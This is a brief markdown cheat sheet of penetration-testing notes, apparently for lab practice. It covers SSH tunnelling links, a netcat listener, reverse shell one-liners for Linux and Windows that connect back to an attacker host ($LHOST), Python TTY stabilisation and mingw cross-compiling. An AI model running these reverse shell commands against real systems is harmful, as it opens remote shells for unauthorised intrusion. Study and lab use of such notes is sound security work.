# Misc: References, and other stuff

excellent summary of SSH tunneling [here](https://tryhackme.com/room/lateralmovementandpivoting)



## Shell catching, and stabilization

set up listener with: 
```
nc –nvlp ${LPORT} 
```

now, from our Linux target box we can do:

```
nc $LHOST $LPORT -e /bin/sh
```
or Windows:

```
nc.exe $LHOST $LPORT -e cmd.exe
```
Afterwards, stabilize with [this](https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal)

Gain TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'` or `python3 -c 'import pty; pty.spawn("/bin/sh")'`

## Revshells

[revshells.com](https://www.revshells.com/)

## Cross-compiling C on kali to windows

mingw-w64 is used to cross compile c files to windows exe files.
This can look something like:

`i686-w64-mingw32-gcc some-c-file.c -o out-file.exe -l ws2_32`

Where `-l ws2_32` tells `mingw32-gcc` to include the `ws2_32` DLL in the final executable with static linking. 

